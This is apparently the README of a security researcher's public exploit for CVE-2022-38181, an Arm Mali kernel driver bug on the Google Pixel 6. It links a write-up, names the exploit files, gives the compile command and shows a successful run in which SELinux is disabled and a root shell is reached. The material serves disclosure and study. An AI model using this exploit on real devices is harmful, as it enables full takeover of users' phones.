## Exploit for CVE-2022-38181

The write up can be found [here](https://github.blog/2023-01-23-pwning-the-all-google-phone-with-a-non-google-bug). This is a bug in the Arm Mali kernel driver that I reported in July 2022. The bug can be used to gain arbitrary kernel code execution from the untrusted app domain, which is then used to disable SELinux and gain root.

The exploit is tested on the Google Pixel 6. The original exploit that was sent to Google is included as `hello-jni.c` as a reference and was tested on the July 2022 patch of the Pixel 6. Due to the fact that Pixel 6 cannot be downgraded from Android 13 to Android 12, an updated version of the exploit, `mali_shrinker_mmap.c` is included, which supports various firmware in Android 13, including the December patch, which is the latest affected version. For reference, I used the following command to compile with clang in ndk-21:

```
android-ndk-r21d-linux-x86_64/android-ndk-r21d/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android30-clang -DSHELL mali_shrinker_mmap.c -o mali_shrinker_mmap
```

The exploit should be run a couple of minutes after boot and should be fairly reliable. If successful, it should disable SELinux and gain root.

```
oriole:/ $ /data/local/tmp/mali_shrinker_mmap
fingerprint: google/oriole/oriole:13/TQ1A.221205.011/9244662:user/release-keys
failed, retry.
failed, retry.
region freed 51
read 0
cleanup flush region
jit_freed
jit_free commit: 0 0
Found freed_idx 0
Found pgd 20, 769c414000
overwrite addr : 7701100710 710
overwrite addr : 7700f00710 710
overwrite addr : 7701100710 710
overwrite addr : 7700f00710 710
overwrite addr : 7700d00710 710
overwrite addr : 7700f00710 710
overwrite addr : 7700d00710 710
overwrite addr : 7701100fd4 fd4
overwrite addr : 7700f00fd4 fd4
overwrite addr : 7701100fd4 fd4
overwrite addr : 7700f00fd4 fd4
overwrite addr : 7700d00fd4 fd4
overwrite addr : 7700f00fd4 fd4
overwrite addr : 7700d00fd4 fd4
result 50
oriole:/ # 
```
